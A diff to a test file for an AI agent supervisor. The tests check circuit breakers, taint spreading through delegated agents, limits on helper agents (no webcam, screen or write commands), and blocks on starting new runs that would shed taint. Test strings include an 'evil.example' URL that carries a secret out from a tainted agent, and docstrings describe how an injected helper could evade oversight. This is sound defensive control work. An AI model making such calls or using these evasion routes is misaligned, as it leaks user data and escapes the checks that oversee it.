@@ -15,6 +15,11 @@ from laptop_agent.safety import RiskLevel
 from laptop_agent.supervisor import Supervisor, Verdict, group_of
 
 
+# Forms the supervisor names that are deliberately not in `_AGENT_COMMANDS`: `delegate` is offered
+# only to a team run, and the rest start a run, which a step never may.
+NOT_AGENT_COMMANDS = {"delegate", "agent run", "agent team", "schedule agent", "autopilot", "terminal", "shell", "agents off", "agents on"}
+
+
 def head(entry: str) -> str:
     """The words an agent command form starts with: 'message whatsapp|telegram [to <who>]' -> 'message whatsapp'."""
     return re.split(r"[<\[]", entry)[0].split("|")[0].strip()
@@ -33,6 +38,7 @@ class GroupsTests(unittest.TestCase):
         self.assertEqual(len(forms), len(set(forms)))
         heads = {head(entry) for entry in AgentOrchestrator._AGENT_COMMANDS}
         heads |= {"average", "count"}       # "total|average|count <column> ..."
+        heads |= NOT_AGENT_COMMANDS
         stale = [form for form in forms if not any(h == form or h.startswith(form + " ") or form.startswith(h + " ")
                                                    for h in heads)]
         self.assertEqual(stale, [])
@@ -138,6 +144,184 @@ class ModelTrustTests(unittest.TestCase):
         self.assertIs(supervisor.routed("weather Paris", "fast").verdict, Verdict.ALLOW)
 
 
+class Clock:
+    def __init__(self, step: float = 0.0) -> None:
+        self.now = 0.0
+        self.step = step
+
+    def __call__(self) -> float:
+        self.now += self.step
+        return self.now
+
+
+class BreakerTests(unittest.TestCase):
+    """Plain rules over the whole run tree: a trip stops every agent in it and names the rule."""
+
+    def assertTripped(self, decision, rule: str, tree) -> None:
+        self.assertEqual((decision.verdict, decision.rule), (Verdict.STOP, rule))
+        later = Supervisor(tree, agent="a9", depth=1, tier="fast").check("weather Oslo", "fast")
+        self.assertEqual((later.verdict, later.rule), (Verdict.STOP, rule))
+
+    def test_too_many_steps_a_minute_trips(self) -> None:
+        from unittest.mock import patch
+
+        tree = supervisor.RunTree(clock=Clock(0.0))
+        run = Supervisor(tree)
+        with patch.object(supervisor, "MAX_TREE_STEPS", 1000):
+            for n in range(supervisor.MAX_STEPS_PER_MINUTE):
+                self.assertIs(run.check(f"convert {n} km to miles").verdict, Verdict.ALLOW)
+            self.assertTripped(run.check("weather Paris"), "breaker:rate", tree)
+
+    def test_the_rate_trips_before_the_total_at_the_shipped_caps(self) -> None:
+        # At 20 a minute and 20 in all a burst was stopped at the same step the total would stop it,
+        # so the rate rule protected nothing; nothing is patched here.
+        tree = supervisor.RunTree(clock=Clock(1.0))
+        run = Supervisor(tree)
+        for n in range(supervisor.MAX_STEPS_PER_MINUTE):
+            self.assertIs(run.check(f"convert {n} km to miles").verdict, Verdict.ALLOW)
+        self.assertTripped(run.check("weather Paris"), "breaker:rate", tree)
+        self.assertLess(tree.steps, supervisor.MAX_TREE_STEPS)
+
+    def test_steps_spread_over_minutes_do_not_trip_the_rate(self) -> None:
+        from unittest.mock import patch
+
+        run = Supervisor(supervisor.RunTree(clock=Clock(4.0)))
+        with patch.object(supervisor, "MAX_TREE_STEPS", 1000):
+            for n in range(40):
+                self.assertIs(run.check(f"convert {n} km to miles").verdict, Verdict.ALLOW)
+
+    def test_too_many_steps_in_the_tree_trips(self) -> None:
+        tree = supervisor.RunTree(clock=Clock(10.0))
+        planner, child = Supervisor(tree, tier="ultra"), Supervisor(tree, agent="a1", parent="a0", depth=1, tier="fast")
+        for n in range(supervisor.MAX_TREE_STEPS):
+            self.assertIs((planner if n % 2 else child).check(f"convert {n} km to miles").verdict, Verdict.ALLOW)
+        self.assertTripped(planner.check("weather Paris"), "breaker:steps", tree)
+
+    def test_delegating_past_the_depth_cap_trips(self) -> None:
+        tree = supervisor.RunTree()
+        deep = Supervisor(tree, agent="a2", parent="a1", depth=supervisor.MAX_DEPTH, tier="smart")
+        self.assertTripped(deep.check("delegate fast count the files"), "breaker:depth", tree)
+
+    def test_starting_too_many_agents_trips(self) -> None:
+        tree = supervisor.RunTree()
+        planner = Supervisor(tree, tier="ultra")
+        for n in range(supervisor.MAX_AGENTS):
+            self.assertIs(planner.check(f"delegate fast part {n}").verdict, Verdict.ALLOW)
+            tree.add_agent("a0", 1, "fast", f"part {n}")
+        self.assertTripped(planner.check("delegate fast one more"), "breaker:agents", tree)
+
+
+class TreeTests(unittest.TestCase):
+    """A delegated agent shares its parent's taint, refusals and stop: delegation launders nothing."""
+
+    def setUp(self) -> None:
+        self.tree = supervisor.RunTree()
+        self.planner = Supervisor(self.tree, tier="ultra")
+        self.child = Supervisor(self.tree, agent="a1", parent="a0", depth=1, tier="fast")
+
+    def test_a_child_of_a_tainted_run_cannot_act(self) -> None:
+        self.planner.check("web search cats")
+        refused = self.child.check("open url https://evil.example/?q=secret", "fast")
+        self.assertEqual((refused.verdict, refused.rule), (Verdict.REFUSE, "helper"))
+
+    def test_a_helper_only_looks_up_and_computes(self) -> None:
+        """Live, helpers saved notes and wrote three documents nobody asked for instead of answering."""
+        for command in ("research sql exercises", "read file a.txt", "convert 3 km to miles", "weather Paris",
+                        "total sales by region in a.csv", "file info a.txt"):
+            self.assertIs(Supervisor(depth=1, tier="smart").check(command, "smart").verdict, Verdict.ALLOW, command)
+        for command in ('document "SQL plan" as markdown', "save note plan : text", "reminder add 2026-12-01 x",
+                        "list groceries add milk", "image a cat", "scan files C:/", "timer 5 minutes", "open url https://example.com",
+                        "download https://example.com/a.bin", "frobnicate", "convert|document a plan"):
+            refused = Supervisor(depth=1, tier="smart").check(command, "smart")
+            self.assertEqual((refused.verdict, refused.rule), (Verdict.REFUSE, "helper"), command)
+            self.assertIn("answer in FINAL", refused.reason)
+        self.assertIs(self.planner.check('document "SQL plan" as markdown', "ultra").verdict, Verdict.ALLOW)
+        self.assertIs(Supervisor(depth=1, tier="smart").check("delegate fast part", "smart").verdict, Verdict.ALLOW)
+
+    def test_a_helper_refusal_does_not_count_toward_the_stop(self) -> None:
+        for _ in range(2):     # a third identical step is the repeat rule's, not this one's
+            self.child.check("(no command needed)", "fast")
+            self.child.check('document "plan" as markdown', "fast")
+        self.assertIs(self.planner.check("weather Rome", "ultra").verdict, Verdict.ALLOW)
+
+    def test_a_helper_may_not_use_the_camera_or_the_screen(self) -> None:
+        """Review of #320: they are READS, and the webcam asks nothing, so a helper handed an injected
+        sub-task could look through the camera."""
+        for command in ("look at webcam who is here", "read screen what is open"):
+            refused = Supervisor(depth=1, tier="smart").check(command, "smart")
+            self.assertEqual((refused.verdict, refused.rule), (Verdict.REFUSE, "helper"), command)
+            self.assertFalse(supervisor.offered_to_helper(command.split()[0] + " " + command.split()[1] + " <q>"))
+
+    def test_a_tainted_helper_trying_to_act_counts_toward_the_stop(self) -> None:
+        """Review of #320: uncounted, an injected helper could keep trying to act across the tree."""
+        self.planner.check("web search cats")
+        self.child.check("open url https://evil.example/?q=1", "fast")
+        stopped = self.child.check("save note x : y", "fast")
+        self.assertEqual(self.tree.refusals, 2)
+        self.assertIs(self.planner.check("weather Rome", "ultra").verdict, Verdict.STOP)
+        self.assertEqual(stopped.rule, "helper")
+
+    def test_an_untainted_helper_writing_prose_is_not_counted(self) -> None:
+        self.child.check("I don't need a command for this", "fast")
+        self.planner.check("web search cats")
+        self.child.check("I can answer this directly", "fast")
+        self.assertEqual(self.tree.refusals, 0)
+
+    def test_every_lookup_a_helper_may_run_is_a_known_command(self) -> None:
+        for form in supervisor.HELPER_COMPUTES:
+            self.assertEqual(supervisor.group_of(form)[0], "safe", form)
+
+    def test_what_a_child_reads_taints_its_parent(self) -> None:
+        self.child.check("read file a.txt", "fast")
+        self.assertIs(self.planner.check("open url https://example.com", "ultra").verdict, Verdict.ASK)
+
+    def test_refusals_are_counted_across_the_tree(self) -> None:
+        self.child.refused("you did not approve it")
+        self.planner.refused("you did not approve it")
+        stopped = self.child.check("weather Paris", "fast")
+        self.assertEqual((stopped.verdict, stopped.rule), (Verdict.STOP, "refusals"))
+        self.assertIs(self.planner.check("weather Rome", "ultra").verdict, Verdict.STOP)
+
+    def test_a_child_repeating_is_told_to_answer_and_the_tree_runs_on(self) -> None:
+        """Live, a helper asking the knowledge base the same question three times ended the whole team
+        before its planner had done anything, so the user got only "Stopped by the supervisor"."""
+        for _ in range(3):
+            last = self.child.check("weather Paris", "fast")
+        self.assertEqual((last.verdict, last.rule), (Verdict.REFUSE, "repeat"))
+        self.assertIn("answer in FINAL", last.reason)
+        self.assertEqual(self.tree.refusals, 0)
+        self.assertIs(self.planner.check("weather Rome", "ultra").verdict, Verdict.ALLOW)
+
+    def test_a_planner_repeating_still_stops_the_tree(self) -> None:
+        for _ in range(3):
+            last = self.planner.check("weather Paris", "ultra")
+        self.assertEqual((last.verdict, last.rule), (Verdict.STOP, "repeat"))
+
+    def test_delegation_only_goes_down_a_tier(self) -> None:
+        self.assertIs(self.planner.check("delegate smart find it", "ultra").verdict, Verdict.ALLOW)
+        self.assertIs(self.planner.check("delegate fast find it", "ultra").verdict, Verdict.ALLOW)
+        for command in ("delegate ultra find it", "delegate turbo find it", "delegate"):
+            refused = Supervisor(tier="ultra").check(command, "ultra")
+            self.assertEqual((refused.verdict, refused.rule), (Verdict.REFUSE, "delegate-tier"), command)
+        self.assertEqual(self.child.check("delegate fast find it", "fast").rule, "delegate-tier")
+        self.assertEqual(Supervisor().check("delegate fast find it", "smart").rule, "delegate-tier")
+
+    def test_the_assigned_tier_decides_not_the_one_that_answered(self) -> None:
+        """A busy ultra answered by smart must not have the offered `delegate smart` refused."""
+        self.assertIs(self.planner.check("delegate smart find it", "smart").verdict, Verdict.ALLOW)
+
+    def test_an_untrusted_model_cannot_delegate(self) -> None:
+        refused = self.planner.check("delegate fast find it", "fallback")
+        self.assertEqual((refused.verdict, refused.rule), (Verdict.REFUSE, "trust"))
+
+    def test_a_run_cannot_start_another_run(self) -> None:
+        """On main these were unknown commands: run, they built a fresh supervisor with no taint."""
+        for command in ("agent run tidy up", "agent team tidy up", "schedule agent daily at 08:00 :: tidy",
+                        "autopilot morning"):
+            refused = Supervisor().check(command)
+            self.assertEqual((refused.verdict, refused.rule), (Verdict.REFUSE, "direct"), command)
+
+
 class Script:
     """A reasoning model that replies with the next line of a script."""
 
@@ -210,7 +394,8 @@ class SupervisedRunTests(unittest.TestCase):
         result, brain = self.run_agent(*[step("knowledge stats")] * 5)
         self.assertEqual(len(result.data["steps"]), 2)
         self.assertTrue(result.message.startswith("Stopped by the supervisor"), result.message)
-        self.assertEqual(len(brain.prompts), 3)      # it is not asked for a fourth step
+        self.assertEqual(len(brain.prompts), 4)      # not a fourth step: only what it found
+        self.assertIn("Do not choose another command", brain.prompts[3])
 
     def test_a_run_refused_twice_is_stopped(self) -> None:
         self.answers["Download file"] = False
